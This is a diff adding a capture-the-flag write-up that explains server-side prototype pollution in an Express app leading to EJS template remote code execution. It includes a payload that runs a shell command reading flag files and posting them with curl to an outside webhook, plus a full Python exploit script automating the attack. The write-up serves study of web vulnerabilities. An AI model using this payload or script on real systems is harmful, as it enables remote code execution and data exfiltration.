@@ -697,7 +697,7 @@ This challenge was particularly mind-boggling, and I spent a considerable amount
 
 This discovery narrowed down my approach to getting the flag by the `note_id` and `note_secret` using the endpoint `/viewNote`. Nevertheless, I still couldn't find a way to get the secret as it's randomly generated.
 
-### Short explanation of the exploit:
+#### Short explanation of the exploit:
 
 The exploit relies on three key factors:
 - The `note_id` is known to be 66
@@ -780,4 +780,397 @@ print(s.get(note_url, params=note_params).text)
 ### Long explanation of the exploit:
 
 for Long explanation of the issue reason you can check this [https://gccybermonks.com/posts/obji2sqli/](https://gccybermonks.com/posts/obji2sqli/)
+
+
+3. Fastest Delivery Service
+
+### Description
+```
+No time for description, I had some orders to deliver : D 
+Note: The code provided is without jailing, please note that when writing exploits.
+
+```
+
+Directory Structure:
+```
+.
+├── app.js
+├── controllers
+│   ├── adminController.js
+│   ├── authController.js
+│   └── orderController.js
+├── data
+│   └── dataStore.js
+├── docker-compose.yml
+├── Dockerfile
+├── ex.py
+├── middlewares
+│   └── auth.js
+├── package-lock.json
+├── package.json
+├── routes
+│   ├── admin.js
+│   ├── auth.js
+│   └── order.js
+└── views
+    ├── address.ejs
+    ├── admin.ejs
+    ├── index.ejs
+    ├── login.ejs
+    ├── order.ejs
+    └── register.ejs
+
+```
+
+### Source Code
+
+As the there is a lot of code, I will only show the important parts of the code.
+
+app.js:
+```js
+const express = require('express');
+const bodyParser = require('body-parser');
+const session = require('express-session');
+const crypto = require("crypto");
+
+const app = express();
+const PORT = 3000;
+
+// In-memory data storage
+let users = {};
+let orders = {};
+let addresses = {};
+
+// Inserting admin user
+users['admin'] = { password: crypto.randomBytes(16).toString('hex'), orders: [], address: '' };
+console.log("users object : ", users);
+// Middleware
+app.use(bodyParser.urlencoded({ extended: false }));
+app.set('view engine', 'ejs');
+app.use(session({
+    secret: crypto.randomBytes(16).toString('hex'),
+    resave: false,
+    saveUninitialized: true
+}));
+
+// Routes
+app.get('/', (req, res) => {
+    res.render('index', { user: req.session.user });
+});
+app.get('/login', (req, res) => {
+    res.render('login');
+});
+
+app.post('/login', (req, res) => {
+    const { username, password } = req.body;
+    console.log(req.body);
+    const user = users[username];
+    console.log("user" ,user);
+    console.log("users object when logging in : ", users);
+
+    if (user && user.password === password) {
+        req.session.user = { username };
+        res.redirect('/');
+    } else {
+        res.send('Invalid credentials. <a href="/login">Try again</a>.');
+    }
+});
+
+app.get('/logout', (req, res) => {
+    req.session.destroy();
+    res.redirect('/');
+});
+
+app.get('/register', (req, res) => {
+    res.render('register');
+});
+
+app.post('/register', (req, res) => {
+    const { username, password } = req.body;
+
+    if (Object.prototype.hasOwnProperty.call(users, username)) {
+        res.send('Username already exists. <a href="/register">Try a different username</a>.');
+    } else {
+        users[username] = { password, orders: [], address: '' };
+        req.session.user = { username };
+        res.redirect(`/address`);
+    }
+});
+
+app.get('/address', (req, res) => {
+    const { user } = req.session;
+    if (user && users[user.username]) {
+        res.render('address', { username: user.username });
+    } else {
+        res.redirect('/register');
+    }
+});
+
+app.post('/address', (req, res) => {
+    const { user } = req.session;
+    const { addressId, Fulladdress } = req.body;
+
+    if (user && users[user.username]) {
+        console.log("address object : ", addresses);
+        addresses[user.username][addressId] = Fulladdress;
+        users[user.username].address = addressId;
+        res.redirect('/login');
+    } else {
+        res.redirect('/register');
+    }
+});
+
+
+
+app.get('/order', (req, res) => {
+    if (req.session.user) {
+        res.render('order');
+    } else {
+        res.redirect('/login');
+    }
+});
+
+app.post('/order', (req, res) => {
+    if (req.session.user) {
+        const { item, quantity } = req.body;
+        const orderId = `order-${Date.now()}`;
+        orders[orderId] = { item, quantity, username: req.session.user.username };
+        users[req.session.user.username].orders.push(orderId);
+        res.redirect('/');
+    } else {
+        res.redirect('/login');
+    }
+});
+
+app.get('/admin', (req, res) => {
+    if (req.session.user && req.session.user.username === 'admin') {
+        const allOrders = Object.keys(orders).map(orderId => ({
+            ...orders[orderId],
+            orderId
+        }));
+        res.render('admin', { orders: allOrders });
+    } else {
+        res.redirect('/');
+    }
+});
+
+
+// Start server
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`Server is running on http://localhost:${PORT}`);
+});
+```
+
+### Solution
+
+This challenge is about server-side prototype pollution.
+
+Breakdown the code:
+
+The code uses express-session for managing session cookies. This can be seen in the following lines:
+
+``` js
+const session = require('express-session');
+
+// ...
+
+app.use(session({
+    secret: crypto.randomBytes(16).toString('hex'),
+    resave: false,
+    saveUninitialized: true
+}));
+```
+
+1. The code sets up an Express.js application with necessary middleware:
+
+  - bodyParser for parsing request bodies
+  - express-session for managing user sessions
+  - EJS as the view engine
+
+2. In-memory data storage is initialized for users, orders, and addresses.
+
+3. An admin user is created with a random password.
+
+4. Routes are defined for various endpoints:
+
+  - '/' (home)
+  - '/login'
+  - '/logout'
+  - '/register'
+  - '/address'
+  - '/order'
+  - '/admin'
+5. Each route has corresponding GET and/or POST handlers.
+
+
+EJS is used to render dynamic content in HTML templates. For example:
+`res.render('index', { user: req.session.user });`
+This renders the 'index' template and passes the user data to it.
+
+#### The parts in interest:
+
+- For user registration:
+
+  - The /register POST endpoint handles new user creation.
+  - The line responsible for saving the user account if not already registered  is: `users[username] = { password, orders: [], address: '' };`
+  - The user is then stored in the session with: `req.session.user = { username };`
+  - Then the user is redirected to the /address route.
+
+
+
+- /address:
+
+  - The GET route checks if the user is logged in and renders the 'address' template if so.
+  - The POST route handles saving the user's address: `addresses[user.username][addressId] = Fulladdress;
+users[user.username].address = addressId;` This line creates a nested structure in the addresses object. It stores the full address (`Fulladdress`) under a specific addressId for the current user. This allows a user to potentially have multiple addresses, each with a unique identifier. The `addressId` and `Full address` are being taken from the request body but the `usernaeme` is taken from the session.
+
+
+#### Exploitation
+if you are familiar with the prototype pollution attack, you will notice that the code is vulnerable to prototype pollution vulnerability. First occurrence of this vulnerability is in the `/register` endpoint because the code is using the `users` object directly without any sanitization or validation. This allows me to modify the `users` object's prototype, so because of this line `users[username] = { password, orders: [], address: '' };` I can add a new property or change existing one of the `users` object's prototype.
+
+
+The second occurrence of this vulnerability is in the `/address` endpoint. This is because the code is using the `addresses` object directly without any sanitization or validation. This allows me to modify the `addresses` object's prototype, so because of this line `addresses[user.username][addressId] = Fulladdress;` we can add a new property or change existing one of the `addresses` object's prototype.
+
+
+#### The journey of searching for a gadget :
+
+A gadget is a piece of code that can be leveraged to perform specific actions when triggered by the vulnerability. In prototype pollution, a gadget is typically a function or code path that uses object properties in a way that can be manipulated through pollution.
+
+In this challenge, I needed to find a gadget that would allow me to execute code by manipulating the `users` and `addresses` object's prototype. I started by looking for a gadget in the codebase that would allow me to get RCE, The reason I was looking for a gadget that would allow me to get RCE is because I wanted to be able to execute code on the server because the the flag is being created in the server using that docker line `RUN echo "$FLAG" > '/tmp/flag_'$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 32).txt` which means the flag is in the /tmp directory and starts with the flag_ and ends with a random string of 32 characters.
+
+The app uses EJS as the view engine so it's perfect to be my gadget to achieve RCE.
+
+This blog post is a great resource for understanding how to use EJS to achieve RCE: https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/
+
+so first we need to pollute the prototype by modifying a property in it called `client` and give the value `1` to it.
+
+then we need to modify the `escapeFunction` property with the value `JSON.stringify; process.mainModule.require('child_process').exec('cat /tmp/flag*.txt | curl -X POST -d @- https://webhook.site/xxxxxxxxx')` to read the flag and send it to the webhook.site.
+
+then we need to trigger the `render` function from the `ejs` module, we can do that by visiting the `/`.
+
+### Exploit
+
+1 - First we need to register an account with the username `__proto__`, the reason behind that is because the way address is being saved in the `/address` endpoint, it's being saved in the `addresses` object with the username from the session as one the keys, so if we register an account with the username `__proto__` we can pollute the prototype of the `addresses` object.
+
+![alt text](<../assets/img/blog/blackhat/fds/reg.png>)
+
+2 - Starting of the changing the two properties in interest which are `client` and `escapeFunction`. Polluting client with the value `1`:
+
+![alt text](<../assets/img/blog/blackhat/fds/clients.png>)
+
+3- Polluting the `escapeFunction` with the value `JSON.stringify; process.mainModule.require('child_process').exec('cat /tmp/flag*.txt | curl -X POST -d @- https://webhook.site/xxxxxxxxx')`:
+
+![alt text](<../assets/img/blog/blackhat/fds/escape.png>)
+
+4 - visit the `/` endpoint to trigger the `render` function from the `ejs` module
+
+> Because the server was restarting every few seconds, I had to write a script to automate the process of getting the flag as soon as the server starts.
+
+```python
+import requests
+
+# Define the base URL
+base_url = "http://ac32871125f6bfce44af2.playat.flagyard.com"
+
+# Common headers
+headers = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Origin": "http://localhost:3000",
+    "Connection": "keep-alive",
+    "Referer": "http://localhost:3000/address",
+    "Upgrade-Insecure-Requests": "1",
+    "Sec-Fetch-Dest": "document",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-Site": "same-origin",
+    "Sec-Fetch-User": "?1",
+    "X-PwnFox-Color": "green",
+    "Priority": "u=0, i"
+}
+
+# Proxy configuration
+proxies = {
+    "http": "http://127.0.0.1:8080",
+    "https": "http://127.0.0.1:8080"
+}
+
+# Create a session object
+session = requests.Session()
+
+# Function to send a POST request using the session
+def send_post_request(url, data):
+    response = session.post(url, headers=headers, data=data, allow_redirects=False, proxies=proxies)
+    return response
+
+# Function to send a GET request using the session
+def send_get_request(url):
+    response = session.get(url, headers=headers, allow_redirects=False, proxies=proxies)
+    return response
+
+# Register
+register_url = f"{base_url}/register"
+register_data = "username=__proto__&password=logan0x"
+register_response = send_post_request(register_url, register_data)
+if register_response.status_code == 302:
+    print("Register Redirect Successful")
+else:
+    print("Register Failed")
+
+# Extract the connect.sid cookie
+connect_sid_cookie = None
+for cookie in session.cookies:
+    if cookie.name == 'connect.sid':
+        connect_sid_cookie = cookie
+        break
+
+if connect_sid_cookie:
+    print(f"Extracted Cookie: {connect_sid_cookie.name}={connect_sid_cookie.value}")
+else:
+    print("Failed to extract connect.sid cookie")
+
+# GET request to /
+root_url = f"{base_url}/"
+root_response = send_get_request(root_url)
+if root_response.status_code == 200:
+    print("Root GET Request Successful")
+else:
+    print("Root GET Request Failed")
+
+# Address - First Request
+address_url = f"{base_url}/address"
+address_data_1 = "username=__proto__&addressId=client&Fulladdress=1"
+address_response_1 = send_post_request(address_url, address_data_1)
+if address_response_1.status_code == 302:
+    print("Address First Request Successful")
+else:
+    print("Address First Request Failed")
+
+# Address - Second Request
+address_data_2 = "username=__proto__&addressId=escapeFunction&Fulladdress=JSON.stringify; process.mainModule.require('child_process').exec('cat /tmp/flag*.txt | curl -X POST -d @- https://webhook.site/29b8fbde-348d-41bf-9eec-d7603249be32')"
+address_response_2 = send_post_request(address_url, address_data_2)
+print(address_response_2.text)
+if address_response_2.status_code == 302:
+    print(address_response_2.text)
+    print("Address Second Request Successful")
+else:
+    print("Address Second Request Failed")
+
+# GET request to / again
+root_response_final = send_get_request(root_url)
+if root_response_final.status_code == 200:
+    print("Final Root GET Request Successful")
+else:
+    print("Final Root GET Request Failed")
+
+```
+
+#### flag:
+
+![alt text](<../assets/img/blog/blackhat/fds/flag.png>)
+
+
+
 
